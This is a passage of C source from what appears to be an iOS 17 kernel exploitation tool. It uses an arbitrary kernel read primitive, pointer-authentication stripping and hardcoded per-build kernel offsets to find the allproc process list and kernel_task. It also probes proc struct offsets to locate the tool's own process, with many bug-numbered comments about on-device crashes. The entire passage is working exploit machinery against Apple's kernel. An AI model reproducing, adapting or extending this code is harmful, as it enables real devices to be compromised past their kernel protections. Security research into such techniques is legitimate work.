    /* Interpretation 2: entry_ptr = proc_base + 0xb0 (SMRQ head entry) */
    if (!found_pid0 && smrq_links_ok && entry_ptr >= 0xb0) {
        uint64_t maybe_base = entry_ptr - 0xb0;
        if (is_heap_ptr_relaxed(maybe_base)) {
            uint32_t pid = 0xFFFFFFFF;
            bool ok = ds_kread32_checked(maybe_base + 0x60, &pid);
            filelog_write("[allproc] kernproc interp2: ptr=0x%llx+0x60 kread=%d pid=%u",
                          maybe_base, (int)ok, pid);
            if (ok && pid == 0) {
                proc_base = maybe_base;
                found_pid0 = true;
            }
        } else {
            filelog_write("[allproc] kernproc interp2: base=0x%llx not relaxed-heap, skip",
                          maybe_base);
        }
    } else if (!found_pid0 && !smrq_links_ok) {
        uint64_t sq0 = 0, sq8 = 0;
        bool sq0_ok = false, sq8_ok = false;
        (void)staged_head_has_kptr_link(entry_ptr, &sq0, &sq0_ok, &sq8, &sq8_ok);
        filelog_write("[allproc] Bug #308: skip interp2 for fake smrq head=0x%llx "
                      "(q0=0x%llx ok=%d q8=0x%llx ok=%d)",
                      entry_ptr, sq0, (int)sq0_ok, sq8, (int)sq8_ok);
    }

    /* Bug #349: interp2b — same fallback for the SMRQ path */
    if (!found_pid0 && smrq_links_ok && entry_ptr >= 0xb0
        && PROC_PID_OFFSET != 0x60 && PROC_PID_OFFSET != 0) {
        uint64_t maybe_base = entry_ptr - 0xb0;
        if (is_heap_ptr_relaxed(maybe_base)) {
            uint32_t pid = 0xFFFFFFFF;
            bool ok = ds_kread32_checked(maybe_base + PROC_PID_OFFSET, &pid);
            filelog_write("[allproc] Bug #349: kernproc interp2b: ptr=0x%llx+0x%x kread=%d pid=%u",
                          maybe_base, PROC_PID_OFFSET, (int)ok, pid);
            if (ok && pid == 0) {
                proc_base = maybe_base;
                found_pid0 = true;
            }
        }
    }

    if (!found_pid0 || !proc_base) {
        filelog_write("[allproc] kernproc detect: PID 0 NOT found at candidate=0x%llx", candidate);
        return false;
    }

    /* Bug #265: Dump first 0x100 bytes BEFORE checks so we always get diagnostics */
    filelog_write("[allproc] kernproc proc0 dump (0x%llx):", proc_base);
    for (uint32_t off = 0; off < 0x100; off += 0x20) {
        uint64_t v0 = 0, v1 = 0, v2 = 0, v3 = 0;
        ds_kread64_checked(proc_base + off, &v0);
        ds_kread64_checked(proc_base + off + 8, &v1);
        ds_kread64_checked(proc_base + off + 16, &v2);
        ds_kread64_checked(proc_base + off + 24, &v3);
        filelog_write("  +0x%02x: %016llx %016llx %016llx %016llx",
                      off, v0, v1, v2, v3);
    }

    /* Bug #265A: Non-fatal proc_ro check at +0x18 — log result but do NOT reject.
     * iOS 17.3.1 proc struct may have a different field at +0x18. */
    uint64_t proc_ro = 0;
    {
        uint64_t proc_ro_raw = 0;
        if (!ds_kread64_checked(proc_base + 0x18, &proc_ro_raw)) {
            filelog_write("[allproc] Bug #265: kread(proc_base+0x18) FAILED — proc_ro check skipped");
        } else {
            proc_ro = pac_strip(proc_ro_raw);
            filelog_write("[allproc] Bug #265: proc_base+0x18 raw=0x%llx stripped=0x%llx is_kptr=%d",
                          proc_ro_raw, proc_ro, (int)is_kptr(proc_ro));
            if (!is_kptr(proc_ro)) {
                filelog_write("[allproc] Bug #265: +0x18 is NOT a kptr — proc_ro offset may differ on this iOS");
                proc_ro = 0;  /* mark as unknown, non-fatal */
            }
        }
    }

    /* Bug #265A: le_prev check — required but with explicit logging */
    uint64_t le_prev = 0;
    {
        uint64_t le_prev_raw = 0;
        if (!ds_kread64_checked(proc_base + 0x08, &le_prev_raw)) {
            filelog_write("[allproc] Bug #265: kread(proc_base+0x08) FAILED for le_prev — rejecting");
            return false;
        }
        le_prev = pac_strip(le_prev_raw);
        uint64_t zmin = ds_get_zone_map_min();
        uint64_t zmax = ds_get_zone_map_max();
        filelog_write("[allproc] kernproc detect: proc=0x%llx pid=0 proc_ro=0x%llx "
                      "le_prev=0x%llx zone=[0x%llx..0x%llx] le_prev_heap=%d",
                      proc_base, proc_ro, le_prev, zmin, zmax,
                      (int)is_heap_ptr_relaxed(le_prev));
        /* le_prev must be non-zero and a valid kernel pointer.
         * For kernel_task at tail of allproc: le_prev = &secondlast->le_next (heap).
         * If kernel_task is the ONLY proc: le_prev = &allproc.lh_first (kdata). */
        if (!le_prev || !is_kptr(le_prev)) {
            filelog_write("[allproc] kernproc detect: le_prev=0x%llx invalid, reject", le_prev);
            return false;
        }
    }

    /* Bug #263D: Try to find the REAL PID offset by probing different offsets
     * on the NEXT proc in chain (which should have PID >= 1). 
     * Try both BSD le_next (proc+0x00) and SMRQ entry (proc+0xb0) for next ptr. */
    filelog_write("[allproc] kernproc: probing PID offset on next proc...");
    uint32_t discovered_pid_off = 0;
    uint32_t original_pid_off = PROC_PID_OFFSET;
    /* Bug #344: Try PROC_PID_OFFSET FIRST (e.g. 0xd8 for iOS 17) before the general scan.
     * Without this, sequential scan hits 0xb8 before 0xd8 — proc0+0xb8=0 coincidentally
     * (unrelated field), next_proc+0xb8=64 (coincidental small value) → wrong offset
     * discovered, PROC_PID_OFFSET set to 0xb8, ourproc() walks list and finds pid=64
     * as max but not ourpid → fails. By prioritising PROC_PID_OFFSET=0xd8 we avoid
     * false positives at earlier offsets in the sequential scan. */
    if (PROC_PID_OFFSET > 0) {
        uint64_t next_direct_raw = 0;
        if (ds_kread64_checked(proc_base + 0x00, &next_direct_raw)) {
            uint64_t next_direct = pac_strip(next_direct_raw);
            if (is_heap_ptr_relaxed(next_direct)) {
                uint32_t pd_val = 0, pd_ktval = 0xFFFFFFFF;
                bool pd_ok  = ds_kread32_checked(next_direct + PROC_PID_OFFSET, &pd_val);
                bool pdk_ok = ds_kread32_checked(proc_base    + PROC_PID_OFFSET, &pd_ktval);
                filelog_write("[allproc] Bug #344: priority check PROC_PID_OFFSET=0x%x "
                              "next_pid=%u (ok=%d) kt_pid=%u (ok=%d)",
                              PROC_PID_OFFSET, pd_val, (int)pd_ok, pd_ktval, (int)pdk_ok);
                if (pd_ok && pd_val > 0 && pd_val < 10000 && pdk_ok && pd_ktval == 0) {
                    filelog_write("[allproc] Bug #344: PROC_PID_OFFSET=0x%x confirmed as pid_off "
                                  "(next_pid=%u, kt_pid=0)", PROC_PID_OFFSET, pd_val);
                    discovered_pid_off = PROC_PID_OFFSET;
                }
            }
        }
    }
    /* Try reading le_next from multiple list offsets */
    static const uint32_t probe_list_offs[] = { 0x00, 0xb0, 0x08, 0x10 };
    for (int li = 0; li < 4 && !discovered_pid_off; li++) {
        uint64_t next_raw = 0;
        if (!ds_kread64_checked(proc_base + probe_list_offs[li], &next_raw)) continue;
        uint64_t next_stripped = pac_strip(next_raw);
        if (!next_stripped || !is_kptr(next_stripped)) continue;
        /* Try both: next as proc base, and next - list_off as proc base */
        uint64_t try_bases[2];
        int ntry = 0;
        if (is_heap_ptr_relaxed(next_stripped))
            try_bases[ntry++] = next_stripped;
        if (probe_list_offs[li] > 0 && next_stripped >= probe_list_offs[li] &&
            is_heap_ptr_relaxed(next_stripped - probe_list_offs[li]))
            try_bases[ntry++] = next_stripped - probe_list_offs[li];
        for (int bi = 0; bi < ntry; bi++) {
            uint64_t nbase = try_bases[bi];
            for (uint32_t poff = 0x00; poff <= 0x300; poff += 8) {
                if (ds_proc_scope_guard_tripped()) {
                    filelog_write("[allproc] Bug #438: proc-scope guard latched during kernproc PID probe "
                                  "(list_off=0x%x base=0x%llx), stopping offset scan and keeping pid_off=0x%x",
                                  probe_list_offs[li], nbase, original_pid_off);
                    break;
                }
                uint32_t val = 0;
                if (ds_kread32_checked(nbase + poff, &val) && val > 0 && val < 10000) {
                    filelog_write("[allproc] kernproc PID probe: list_off=0x%x base=0x%llx +0x%x = %u",
                                  probe_list_offs[li], nbase, poff, val);
                    /* Bug #267A: Verify EACH candidate immediately against kernel_task.
                     * Previous code only kept the FIRST match (e.g. offset 0x10 val=17),
                     * which failed verification. The CORRECT offset (e.g. 0xd8 val=115)
                     * was found but never checked. Now we verify inline and accept
                     * the first candidate that passes BOTH checks. */
                    uint32_t kt_val = 0xFFFFFFFF;
                    bool kt_ok = ds_kread32_checked(proc_base + poff, &kt_val);
                    if (kt_ok && kt_val == 0) {
                        filelog_write("[allproc] Bug #267A: PID offset 0x%x ACCEPTED "
                                      "(val=%u, kernel_task+0x%x=0)", poff, val, poff);
                        discovered_pid_off = poff;
                    } else {
                        filelog_write("[allproc] Bug #267A: PID offset 0x%x REJECTED "
                                      "(val=%u, kernel_task+0x%x=%u)", poff, val, poff, kt_val);
                    }
                }
                if (discovered_pid_off) break;
            }
            if (discovered_pid_off) break;
        }
        if (discovered_pid_off) break;
    }
    if (discovered_pid_off && discovered_pid_off != original_pid_off) {
        filelog_write("[allproc] Bug #286A: tentative PID offset 0x%x -> 0x%x (pending candidate validation)",
                      original_pid_off, discovered_pid_off);
    }

    if (ds_proc_scope_guard_tripped()) {
        filelog_write("[allproc] Bug #438: resetting proc-scope guard after kernproc PID probe "
                      "before chain validation (candidate=0x%llx, pid_off=0x%x)",
                      candidate, discovered_pid_off ? discovered_pid_off : original_pid_off);
        ds_reset_proc_scope_guard();
    }

    /* Bug #303: proc0.le_prev == candidate is only a strong structural hint, not
     * definitive proof on its own.  Session 25f showed a false-positive candidate
     * can still satisfy this back-reference while its forward walk stays trapped in
     * a nearby PID=0-only chain.  Keep the back-reference as a signal, but still
     * require Bug #268 chain validation before accepting the candidate. */
    bool head_backref_match = false;
    if (!is_heap_ptr_relaxed(le_prev) && is_kptr(le_prev) && le_prev == candidate) {
        filelog_write("[allproc] Bug #303: proc0.le_prev == candidate 0x%llx — "
                      "strong LIST_HEAD hint, but still validating chain", candidate);
        if (discovered_pid_off && discovered_pid_off != original_pid_off) {
            /* Bug #361/#454: discovered_pid_off can be a false positive at large offsets,
             * but session 17:17 shows candidate 0x3213678 repeatedly proving a SMALL
             * discovered offset (0xd8) against kernel_task/next-proc while the trusted
             * heuristic 0x60 keeps producing a zero-only chain.  For strong le_prev-backed
             * candidates, validate BOTH offsets now instead of forcing the trusted one first.
             * Keep the old suspicion guard only for clearly unreasonable values (>0x1FF). */
            pid_t b372_ourpid = getpid();
            uint32_t pid_off_tries[2] = {0};
            int pid_off_try_count = 0;
            if (discovered_pid_off > 0 && discovered_pid_off <= 0x1FF) {
                pid_off_tries[pid_off_try_count++] = discovered_pid_off;
            } else if (discovered_pid_off > 0) {
                filelog_write("[allproc] Bug #361: discovered pid_off=0x%x looks unreasonable, "
                              "deferring to original 0x%x for le_prev-backed validation",
                              discovered_pid_off, original_pid_off);
            }
            if (original_pid_off > 0 && original_pid_off != discovered_pid_off) {
                pid_off_tries[pid_off_try_count++] = original_pid_off;
            }

            uint32_t pid_off_to_accept = 0;
            bool b372_fwd_ok = false;
            for (int pid_try_idx = 0; pid_try_idx < pid_off_try_count; pid_try_idx++) {
                uint32_t try_pid_off = pid_off_tries[pid_try_idx];
                bool try_ok = validate_kernproc_forward_chain(proc_base, try_pid_off, b372_ourpid);
                filelog_write("[allproc] Bug #454: le_prev-backed candidate 0x%llx "
                              "forward-chain try pid_off=0x%x -> %s",
                              candidate, try_pid_off, try_ok ? "PASS" : "FAIL");
                if (try_ok) {
                    pid_off_to_accept = try_pid_off;
                    b372_fwd_ok = true;
                    break;
                }
            }

            if (!b372_fwd_ok) {
                filelog_write("[allproc] Bug #372: Bug #317 candidate 0x%llx REJECTED -- "
                              "forward chain with discovered/original pid_off did not reach ourpid=%d "
                              "(le_prev backref was false positive, ignoring)",
                              candidate, (int)b372_ourpid);
                return false;
            }
            if (pid_off_to_accept != original_pid_off && original_pid_off > 0) {
                filelog_write("[allproc] Bug #454: overriding trusted pid_off 0x%x with "
                              "evidence-backed pid_off 0x%x for candidate 0x%llx",
                              original_pid_off, pid_off_to_accept, candidate);
            }
            filelog_write("[allproc] Bug #317+372: le_prev backref + fwd chain OK, pid_off=0x%x -- "
                          "accepting candidate 0x%llx",
                          pid_off_to_accept, candidate);
            PROC_PID_OFFSET = pid_off_to_accept;
            uint32_t decode_list_off = (entry_ptr == proc_base) ? 0 : 0xb0;
            PROC_LIST_OFFSET = decode_list_off;
            PROC_NEXT_OFFSET = 0;
            PROC_PREV_OFFSET = 0x08;
            g_direct_layout_set = true;
            g_kernproc_addr = candidate;
            g_kernproc_is_pid0 = true;
            filelog_write("[allproc] KERNPROC detected at 0x%llx (offset 0x%llx): "
                          "kernel_task=0x%llx decode_list_off=0x%x pid_off=0x%x [B372-validated]",
                          candidate, candidate - ds_get_kernel_base(), proc_base, decode_list_off,
                          PROC_PID_OFFSET);
            return true;
        }
        head_backref_match = true;
    }

    /* Bug #268: reject short/low-diversity false-positive chains before
     * accepting this candidate as kernproc/allproc head source. */
    {
        uint32_t pid_off_for_validation = discovered_pid_off ? discovered_pid_off : original_pid_off;
        pid_t ourpid = getpid();
        bool chain_ok = validate_kernproc_forward_chain(proc_base, pid_off_for_validation, ourpid);
        if (!chain_ok && discovered_pid_off && discovered_pid_off != original_pid_off) {
            filelog_write("[allproc] Bug #315: forward chain failed with discovered pid_off=0x%x, "
                          "retrying with default 0x%x", discovered_pid_off, original_pid_off);
            pid_off_for_validation = original_pid_off;
            chain_ok = validate_kernproc_forward_chain(proc_base, pid_off_for_validation, ourpid);
        }
        if (!chain_ok && is_heap_ptr_relaxed(le_prev)) {
            filelog_write("[allproc] Bug #288: forward kernproc chain weak, trying backward le_prev walk");
            chain_ok = validate_kernproc_backward_chain(proc_base, pid_off_for_validation, ourpid);
            if (!chain_ok) {
                uint32_t back_pid_off = 0;
                if (probe_kernproc_backward_pid_offset_for_ourpid(proc_base, ourpid, &back_pid_off)) {
                    filelog_write("[allproc] Bug #289: backward walk found our PID with pid_off=0x%x", back_pid_off);
                    discovered_pid_off = back_pid_off;
                    chain_ok = true;
                }
            }
        }
        if (!chain_ok && head_backref_match && discovered_pid_off && discovered_pid_off != original_pid_off) {
            /* Bug #361: accept the candidate for triage, but keep original_pid_off if trusted. */
            uint32_t pid_off_for_triage = (original_pid_off > 0) ? original_pid_off : discovered_pid_off;
            filelog_write("[allproc] Bug #317: le_prev back-reference + discovered pid_off=0x%x "
                          "is strong enough for success-path triage — accepting candidate 0x%llx "
                          "and deferring final proof to ourproc() (using pid_off=0x%x)",
                          discovered_pid_off, candidate, pid_off_for_triage);
            if (pid_off_for_triage != discovered_pid_off) discovered_pid_off = pid_off_for_triage;
            chain_ok = true;
        }
        if (!chain_ok && ds_build_is_21D61()) {
            uint64_t cand_off = candidate - ds_get_kernel_base();
            uint64_t q0_raw = 0;
            bool q0_ok = ds_kread64_checked(proc_base + 0x00, &q0_raw);
            uint64_t q8_raw = 0;
            bool q8_ok = ds_kread64_checked(proc_base + 0x08, &q8_raw);
            uint64_t q8 = q8_ok ? pac_strip(q8_raw) : 0;
            /* Bug #451: 21D61 runtime repeatedly shows kbase+0x3213680 decoding to a
             * PID-0 proc where +0x00==0 and +0x08 points to a heap predecessor. The
             * hardened detector rejects it because the visible chain is only ~11 nodes,
             * but this shape is still strong enough for safe ourproc()-side triage:
             * ourproc() can backward-walk from kernel_task, brute-force PID offsets on
             * the walked procs, and then continue into the guarded Bug #243/266/296
             * fallback logic without re-entering the dangerous scan path.
             * Keep this escape hatch build- and offset-specific to avoid reopening the
             * old generic false-positive issue. */
            if (cand_off == 0x3213680ULL &&
                q0_ok && pac_strip(q0_raw) == 0 &&
                q8_ok && is_heap_ptr_relaxed(q8) &&
                is_heap_ptr_relaxed(le_prev)) {
                filelog_write("[allproc] Bug #451: accepting 21D61 kernproc triage candidate 0x%llx "
                              "(off=0x%llx pid0 q0=0 q8=0x%llx le_prev=0x%llx) and deferring "
                              "full proof to ourproc() backward/alt-list fallbacks",
                              candidate, cand_off, q8, le_prev);
                discovered_pid_off = original_pid_off;
                chain_ok = true;
            }
        }
        if (!chain_ok) {
            filelog_write("[allproc] Bug #303: rejecting candidate 0x%llx despite le_prev back-reference; "
                          "chain remained non-user-visible", candidate);
            if (PROC_PID_OFFSET != original_pid_off) {
                filelog_write("[allproc] Bug #286A: restoring PID offset to 0x%x after rejected candidate", original_pid_off);
                PROC_PID_OFFSET = original_pid_off;
            }
            return false;
        }
    }

    if (discovered_pid_off && discovered_pid_off != original_pid_off) {
        if (original_pid_off > 0) {
            /* Bug #361: do not override a trusted iOS-version-derived offset. */
            filelog_write("[allproc] Bug #361: NOT changing PROC_PID_OFFSET 0x%x -> 0x%x "
                          "(original trusted, discovered is suspect)",
                          original_pid_off, discovered_pid_off);
        } else {
            filelog_write("[allproc] Bug #286A: PID offset CHANGED 0x%x -> 0x%x (validated)",
                          original_pid_off, discovered_pid_off);
            PROC_PID_OFFSET = discovered_pid_off;
        }
    }

    /* Set layout for ourproc() decoding:
     * *(candidate) might be proc_base or proc_base+0xb0.  We need ourproc()
     * to compute the correct proc_base from raw_head.
     * If entry_ptr == proc_base: list_off=0 → kernproc = stripped - 0 = proc_base ✓
     * If entry_ptr == proc_base+0xb0: list_off=0xb0 → kernproc = stripped - 0xb0 = proc_base ✓ */
    uint32_t decode_list_off = (entry_ptr == proc_base) ? 0 : 0xb0;
    PROC_LIST_OFFSET = decode_list_off;
    PROC_NEXT_OFFSET = 0;
    PROC_PREV_OFFSET = 0x08;
    g_direct_layout_set = true;
    g_kernproc_addr = candidate;
    g_kernproc_is_pid0 = true;

    filelog_write("[allproc] KERNPROC detected at 0x%llx (offset 0x%llx): "
                  "kernel_task=0x%llx decode_list_off=0x%x pid_off=0x%x",
                  candidate, candidate - ds_get_kernel_base(), proc_base, decode_list_off,
                  PROC_PID_OFFSET);
    return true;
}

static bool validate_direct_allproc_v2(uint64_t candidate) {
    /* Bug #240: Try multiple list_off values.
     * iOS 17 SMRQ uses list_off=0xb0 (confirmed session 25d score=49).
     * Try 0xb0 FIRST (most likely), then other common offsets.
     * Each attempt costs ~50 kreads max, so trying several is safe. */
    static const uint32_t try_list_offs[] = { 0xb0, 0x00, 0xa8, 0x10, 0x08 };
    for (int i = 0; i < (int)(sizeof(try_list_offs)/sizeof(try_list_offs[0])); i++) {
        if (validate_direct_allproc_v2_with_layout(candidate, try_list_offs[i])) {
            return true;
        }
    }
    return false;
}

static uint64_t kernprocaddress(void) {
    uint64_t kbase = ds_get_kernel_base();
    if (!kbase) return 0;

    filelog_write("[allproc] enter kernprocaddress: kbase=0x%llx", kbase);
    if (ds_proc_scope_guard_tripped()) {
        filelog_write("[allproc] PANIC GUARD latched before discovery, aborting kernprocaddress");
        return 0;
    }

    /* Cache hit — re-validate on each call (kbase changes per boot).
     * Bug #259A / #263E: Lightweight cache validation.
     * Must also detect if cached result was a FALSE allproc (Bug #263). */
    if (g_kernproc_addr) {
        bool cache_ok = false;
        if (g_direct_layout_set) {
            uint64_t cached_head = 0;
            if (ds_kread64_checked(g_kernproc_addr, &cached_head)) {
                uint64_t cs = pac_strip(cached_head);
                if (is_heap_ptr_relaxed(cs)) {
                    cache_ok = true;
                } else if (is_kptr(cs) && cs >= kbase && cs < kbase + 0x4000000ULL) {
                    /* Bug #263E: DATA-resident head — verify it's not the false-allproc
                     * by checking that the SECOND entry has a plausible PID.
                     * If PID=0 → this was the wrong candidate, invalidate cache. */
                    uint64_t entry = cs;
                    if (PROC_LIST_OFFSET == 0xb0 && entry >= 0xb0) {
                        uint64_t base2 = entry - 0xb0;
                        uint64_t smrq_raw = 0;
                        if (ds_kread64_checked(entry, &smrq_raw)) {
                            uint64_t sn = pac_strip(smrq_raw);
                            if (sn >= 0xb0) {
                                uint32_t np = 0;
                                ds_kread32_checked((sn - 0xb0) + PROC_PID_OFFSET, &np);
                                if (np > 0 && is_plausible_pid(np)) {
                                    cache_ok = true;
                                } else {
                                    filelog_write("[allproc] Bug #263E: cached DATA allproc has PID=0 chain — INVALIDATING");
                                }
                            }
                        }
                    } else {
                        cache_ok = true;
                    }
                }
            }
        }
        if (!cache_ok) {
            cache_ok = validate_allproc(g_kernproc_addr);
        }
        if (cache_ok) {
            filelog_write("[allproc] using runtime cached kernproc addr: 0x%llx", g_kernproc_addr);
            return g_kernproc_addr;
        }
    }
    g_kernproc_addr = 0;
    g_direct_layout_set = false;  /* Bug #263E: reset layout on cache invalidation */
    g_kernproc_is_pid0 = false;  /* Bug #255: reset on re-entry */

    /* Lara parity: prefer previously validated persisted offset first.
     * This avoids expensive/risky broad scans on subsequent runs when we
     * already have a known-good allproc location for this kernel build. */
    {
        uint64_t persisted = loadkernproc();
        if (persisted != 0) {
            uint64_t persisted_addr = 0;
            if (try_allproc_candidate("persisted", kbase, persisted, false, &persisted_addr)) {
                filelog_write("[allproc] using persisted kernproc offset 0x%llx", persisted);
                return persisted_addr;
            }
            filelog_write("[allproc] persisted offset 0x%llx invalid for current run, continuing discovery", persisted);
        }
    }

    /* Bug #233: CRITICAL — all previous curated candidates (0x31FFF30, 0x31FFB50,
     * 0x31FFC68) were WRONG. They pointed to circular proc sublists (process groups
     * or session lists), NOT the real allproc. Session 20 confirmed: kbase+0x31FFB50
     * contains a 6-proc circular list that cycles forever.
     *
     * Strategy 1: GOT-based resolution.
     * ipsw_analysis found allproc_symbol at kbase+0x93B348 (__DATA_CONST GOT entry).
     * At runtime, this GOT entry contains a PAC'd pointer to the real allproc variable.
     * Read it, PAC strip → allproc address. Then validate normally.
     *
     * Strategy 2: Direct allproc at kbase+0x3198060 (outer __DATA+0x60).
     * This is in the __PPLDATA sub-region, but PPL only protects WRITES.
     * READS from EL1 should succeed. */
    {
        uint64_t addr = 0;

        /* Strategy 1: GOT entry resolution */
        uint64_t got_addr = kbase + 0x93B348ULL;
        uint64_t got_val = 0;
        filelog_write("[allproc] trying GOT resolution: GOT at 0x%llx", got_addr);
        if (ds_kread64_checked(got_addr, &got_val)) {
            uint64_t allproc_ptr = pac_strip(got_val);
            filelog_write("[allproc] GOT value=0x%llx stripped=0x%llx is_kptr=%d",
                          got_val, allproc_ptr, (int)is_kptr(allproc_ptr));
            if (allproc_ptr && is_kptr(allproc_ptr)) {
                /* allproc_ptr is the runtime address of the allproc variable */
                g_validate_curated = true;
                bool ok = validate_allproc(allproc_ptr);
                g_validate_curated = false;
                if (ok) {
                    filelog_write("[allproc] GOT resolution SUCCESS: allproc=0x%llx", allproc_ptr);
                    g_kernproc_addr = allproc_ptr;
                    return allproc_ptr;
                }
                filelog_write("[allproc] GOT resolved addr 0x%llx failed validation", allproc_ptr);
            }
        } else {
            filelog_write("[allproc] GOT read at 0x%llx failed", got_addr);
        }

        /* Strategy 2: Direct allproc at outer __DATA + 0x60 (__PPLDATA region).
         * PPL protects writes, not reads. This should be readable via our kread. */
        if (try_allproc_candidate("PPLDATA_allproc", kbase, 0x3198060ULL, true, &addr)) {
            filelog_write("[allproc] direct PPLDATA allproc SUCCESS");
            return addr;
        }

        /* Bug #237: disable the old __DATA curated globals entirely.
         * Session 24 showed we now survive long enough to reach ourproc(), but
         * still disconnect while probing DATA_0x31FFF30 before the new narrow
         * aligned scan windows can run. These legacy candidates are either
         * non-heap globals or previously proven false positives; skip straight
         * to the safer scan path. */
        filelog_write("[allproc] legacy DATA curated candidates disabled, trying scan");
    }

    /* Bug #239 + Bug #245 + Bug #246: Direct allproc candidates.
     *
    * Session 25 runtime gave candidates around 0x321C400..0x321C408.
    * Session 25d syslog later proved a stronger direct head at 0x321C480.
    * Continued offline tests v7..v14 refined additional strong
     * __DATA.__common/__bss candidates that are safer to probe with a single
     * 8-byte read than to discover through the noisy 16KB range scan.
     *
    * Current shortlist:
    *   0x321C480  runtime-proven allproc head from session 25d syslog
    *   0x321C240  strongest runtime-adjacent doubly-linked head candidate;
    *              v12/v15/v17 show explicit prev+next head mutation
    *   0x3213680  strongest __common doubly-linked candidate from v14/v17
    *   0x3213660..0x3213690 (step 0x8) adjacent micro-window around
    *              0x3213678/0x3213680 to tolerate small symbol drift
    *   0x31C3000  retained high-confidence fallback from focused proc windows;
    *              v16/v18 still show limited PID/head-store evidence
    *   0x3214850          demoted by Bug #312 after repeated fake-head panics
    *                      on-device; keep only for explicit manual probes
    *   0x3213EC8          demoted by Bug #311 after repeated fake-head panics;
    *                      keep only for explicit manual probes
    *   0x321C220          v20 shows exact refs but only arithmetic/address-anchor usage,
    *                      not a head->node traversal
     *   0x31C30B0  v20 shows repeated [head] + [head+0x8] compares, which looks
     *              like paired queue-head state rather than LIST_HEAD.lh_first
    *   0x321C248/3F8/400/408  v19 found no exact head-load windows; these now stay
    *                           only as tail-end session-artifact probes
     *
     * Try these FIRST to skip the risky 16KB chunk scan entirely. */
    {
        /* Bug #280: default to conservative direct shortlist on unstable sessions.
         * DATA-heavy candidates (0x321C2xx/0x321C4xx) are left for opt-in
         * diagnostics only via DS_ENABLE_DATA_DIRECT=1. */
        static const uint64_t direct_offs_minimal[] = {
            0x31FFF30ULL,   /* Bug #292: allproc LIST_HEAD for iOS 17.3.1 (21D61) A12Z — outer __DATA+0x67F30 */
            0x3213678ULL,   /* allproc LIST_HEAD candidate */
            0x3213680ULL,   /* kernproc candidate */
        };
        static const uint64_t direct_offs_safe[] = {
            0x31FFF30ULL,   /* Bug #292: allproc LIST_HEAD for iOS 17.3.1 (21D61) A12Z — outer __DATA+0x67F30 */
            0x3213660ULL,
            0x3213668ULL,
            0x3213670ULL,
            0x3213678ULL,   /* allproc LIST_HEAD candidate */
            0x3213680ULL,   /* kernproc candidate */
            0x3213688ULL,
            0x3213690ULL,
            0x321C480ULL,   /* Bug #389: runtime-proven allproc at kbase+0x321C480 */
            0x321C240ULL,   /* Bug #340: real allproc DATA proc0 head (Build 55: *(0x321C408)=kdata(0x321C240)) */
            0x321C408ULL,   /* Bug #340: confirmed real allproc offset (Build 52-54 heap, Build 55 kdata) */
            0x321C400ULL,   /* Bug #340: adjacent ±8 drift probes */
            0x321C410ULL,
            0x31C3000ULL,
        };
        static const uint64_t direct_offs_full[] = {
            0x31FFF30ULL,   /* Bug #292: allproc LIST_HEAD for iOS 17.3.1 (21D61) A12Z — outer __DATA+0x67F30 */
            0x3213660ULL,
            0x3213668ULL,
            0x3213670ULL,
            0x3213678ULL,
            0x3213680ULL,
            0x3213688ULL,
            0x3213690ULL,
            0x321C480ULL,
            0x321C240ULL,
            0x31C3000ULL,
            0x321C220ULL,
            0x31C30B0ULL,
            0x321C248ULL,
            0x321C3F8ULL,
            0x321C400ULL,
            0x321C408ULL,
        };

        const char *direct_mode = getenv("DS_DIRECT_MODE");
        const char *enable_data_direct = getenv("DS_ENABLE_DATA_DIRECT");
        const bool use_full_direct = (enable_data_direct && enable_data_direct[0] == '1') ||
                                     (direct_mode && !strcmp(direct_mode, "full"));
        const bool use_safe_direct = !use_full_direct && direct_mode && !strcmp(direct_mode, "safe");

        const uint64_t *direct_offs = direct_offs_minimal;
        int direct_cnt = (int)(sizeof(direct_offs_minimal)/sizeof(direct_offs_minimal[0]));
        const char *resolved_mode = "minimal";
        bool auto_safe_fallback = false;

        if (use_full_direct) {
            direct_offs = direct_offs_full;
            direct_cnt = (int)(sizeof(direct_offs_full)/sizeof(direct_offs_full[0]));
            resolved_mode = "full";
        } else if (use_safe_direct) {
            direct_offs = direct_offs_safe;
            direct_cnt = (int)(sizeof(direct_offs_safe)/sizeof(direct_offs_safe[0]));
            resolved_mode = "safe";
        }

        filelog_write("[allproc] direct shortlist mode: %s (DS_DIRECT_MODE=%s, DS_ENABLE_DATA_DIRECT=%s)",
                      resolved_mode,
                      direct_mode ? direct_mode : "unset",
                      enable_data_direct ? enable_data_direct : "unset");

        if (!use_full_direct && !use_safe_direct && !direct_mode && !enable_data_direct) {
            auto_safe_fallback = true;
        }

        const uint64_t *pass_offs[2] = { direct_offs, direct_offs_safe };
        int pass_cnt[2] = {
            direct_cnt,
            (int)(sizeof(direct_offs_safe)/sizeof(direct_offs_safe[0]))
        };
        const char *pass_mode[2] = { resolved_mode, "safe" };
        int total_passes = auto_safe_fallback ? 2 : 1;

        uint64_t last_direct_candidate = 0;
        uint64_t last_direct_offset = 0;

        for (int pass = 0; pass < total_passes; pass++) {
            const uint64_t *cur_offs = pass_offs[pass];
            int cur_cnt = pass_cnt[pass];

            if (pass > 0) {
                filelog_write("[allproc] Bug #290: minimal shortlist exhausted, auto-fallback to safe shortlist");
                /* Bug #442: clear failed-head blacklist between passes so that a head that
                 * was rejected in pass-0 (e.g. via disc_pl failure before Bug #443 fix)
                 * gets a fresh chance in the wider safe-shortlist pass. */
                g_failed_allproc_head_count = 0;
                filelog_write("[allproc] Bug #442: cleared failed-head blacklist before safe-shortlist pass");
            }

            if (pass > 0) {
                filelog_write("[allproc] direct shortlist mode: %s (auto fallback)", pass_mode[pass]);
            }

            for (int i = 0; i < cur_cnt; i++) {
                if (ds_proc_scope_guard_tripped()) {
                    filelog_write("[allproc] Bug #437: PANIC GUARD latched during direct shortlist "
                                  "after candidate 0x%llx (offset 0x%llx); resetting and continuing",
                                  last_direct_candidate, last_direct_offset);
                    ds_reset_proc_scope_guard();
                }
                uint64_t candidate = kbase + cur_offs[i];
                last_direct_candidate = candidate;
                last_direct_offset = cur_offs[i];

                /* Bug #265B: skip blacklisted candidates (invalidated by Bug #263F) */
                bool blacklisted = false;
                for (int bi = 0; bi < g_blacklisted_count; bi++) {
                    if (g_blacklisted_candidates[bi] == candidate) {
                        blacklisted = true;
                        break;
                    }
                }
                if (blacklisted) {
                    filelog_write("[allproc] Bug #265B: SKIPPING blacklisted candidate 0x%llx", candidate);
                    continue;
                }

                filelog_write("[allproc] trying direct offset 0x%llx -> 0x%llx", cur_offs[i], candidate);
                uint64_t head_val = 0;
                if (!ds_kread64_checked(candidate, &head_val)) {
                    filelog_write("[allproc] direct read failed at 0x%llx", candidate);
                    continue;
                }
                uint64_t stripped = pac_strip(head_val);
